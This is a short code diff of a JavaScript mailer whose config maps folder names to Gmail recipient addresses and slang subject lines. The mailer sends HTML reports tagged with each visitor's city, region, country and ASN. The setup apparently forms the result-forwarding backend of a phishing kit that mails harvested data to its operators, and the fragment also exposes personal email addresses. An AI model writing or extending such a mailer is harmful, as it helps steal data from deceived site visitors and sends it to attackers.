@@ -24,7 +24,7 @@ const EMAIL_CONFIG = {
     },
     'ggwxzzr': {
         email: ['bayuprabowo0202@gmail.com', 'chilligemaass@gmail.com'],
-        fromName: '𝗕𝗔𝗬𝗭𝗭 𝗟𝗔𝗚𝗜 𝗠𝗢𝗢𝗗 𝗡𝗘𝗕𝗔𝗥🔥🥱',
+        fromName: 'WHEN YA PERDETIK🔥👾',
         subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗦𝗜 𝗔𝗡𝗝𝗜𝗡𝗚'
     },
     'hgefdyt': {
@@ -307,7 +307,7 @@ body{
         await transporter.sendMail({
             from: `"${config.fromName} ${flagEmoji}" <${SENDER_EMAIL}>`,
             to: receiver,
-            subject: `${config.subject} ${flagEmoji} ${cityName} - ${regionName}`,
+            subject: `${config.subject} ${flagEmoji} ${SENDER_EMAIL} ${cityName} - ${regionName}`,
             html: htmlContent
         });
         console.log(`✅ [${folderName}] Sent to: ${receiver} - Location: ${cityName}, ${regionName}, ${countryName} | ASN: ${asnInfo}`);
